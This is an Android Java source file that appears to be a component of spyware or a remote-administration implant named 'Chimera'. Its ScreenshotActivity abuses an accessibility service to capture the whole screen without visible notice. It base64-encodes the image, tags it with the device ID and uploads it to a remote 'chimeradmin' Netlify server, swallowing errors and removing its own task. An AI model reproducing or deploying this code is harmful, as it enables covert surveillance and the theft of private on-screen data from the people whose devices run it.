package com.chimera;

import android.accessibilityservice.AccessibilityService;
import android.graphics.Bitmap;
import android.hardware.HardwareBuffer;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Base64;
import android.util.Log;
import android.view.Display;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import com.android.volley.DefaultRetryPolicy;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;

public class ScreenshotActivity extends AppCompatActivity {

    private static final String TAG = "ScreenshotActivity";
    private static final String SUBMIT_DATA_URL = "https://chimeradmin.netlify.app/.netlify/functions/submit-data";
    private static final String UPLOAD_FILE_URL = "https://chimeradmin.netlify.app/.netlify/functions/upload-file";

    private RequestQueue requestQueue;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestQueue = Volley.newRequestQueue(this);

        if (CoreService.getSharedInstance() == null) {
            submitErrorToServer("Screenshot failed: CoreService is not active.");
            finishAndRemoveTask();
            return;
        }
        
        takeScreenshot();
    }
    
    private void takeScreenshot() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            submitErrorToServer("Screenshot API requires Android 11+.");
            finishAndRemoveTask();
            return;
        }

        CoreService service = CoreService.getSharedInstance();
        service.takeScreenshot(Display.DEFAULT_DISPLAY, getMainExecutor(), new AccessibilityService.TakeScreenshotCallback() {
            @Override
            public void onSuccess(@NonNull AccessibilityService.ScreenshotResult screenshotResult) {
                HardwareBuffer buffer = screenshotResult.getHardwareBuffer();
                if (buffer == null) {
                    submitErrorToServer("Capture returned a null HardwareBuffer.");
                    finishAndRemoveTask();
                    return;
                }
                
                final Bitmap bitmap = Bitmap.wrapHardwareBuffer(buffer, screenshotResult.getColorSpace());
                buffer.close();
                
                if (bitmap != null) {
                    processAndUploadBitmap(bitmap);
                } else {
                    submitErrorToServer("Bitmap creation from HardwareBuffer failed.");
                    finishAndRemoveTask();
                }
            }
            @Override
            public void onFailure(int errorCode) {
                submitErrorToServer("Native capture failed with code: " + errorCode);
                finishAndRemoveTask();
            }
        });
    }
    
    private void processAndUploadBitmap(Bitmap bitmap) {
        try {
            ByteArrayOutputStream stream = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, 80, stream);
            String encodedImage = Base64.encodeToString(stream.toByteArray(), Base64.DEFAULT);
            uploadFileToServer("screenshot", encodedImage);
        } catch (Exception e) {
            submitErrorToServer("Bitmap processing failed: " + e.getMessage());
        } finally {
            finishAndRemoveTask();
        }
    }

    private void uploadFileToServer(String dataType, String base64Data) {
        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        JSONObject postData = new JSONObject();
        try {
            postData.put("deviceId", deviceId);
            postData.put("dataType", dataType);
            postData.put("fileData", base64Data);
            JsonObjectRequest request = new JsonObjectRequest(Request.Method.POST, UPLOAD_FILE_URL, postData, r -> {}, e -> {});
            request.setRetryPolicy(new DefaultRetryPolicy(30000, 1, DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));
            requestQueue.add(request);
        } catch (JSONException e) { /* fail silently */ }
    }

    private void submitErrorToServer(String errorMessage) {
        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        JSONObject postData = new JSONObject();
        try {
            postData.put("deviceId", deviceId);
            postData.put("dataType", "screenshot_error");
            postData.put("payload", errorMessage);
            JsonObjectRequest request = new JsonObjectRequest(Request.Method.POST, SUBMIT_DATA_URL, postData, r -> {}, e -> {});
            requestQueue.add(request);
        } catch (JSONException e) { /* fail silently */ }
    }
}
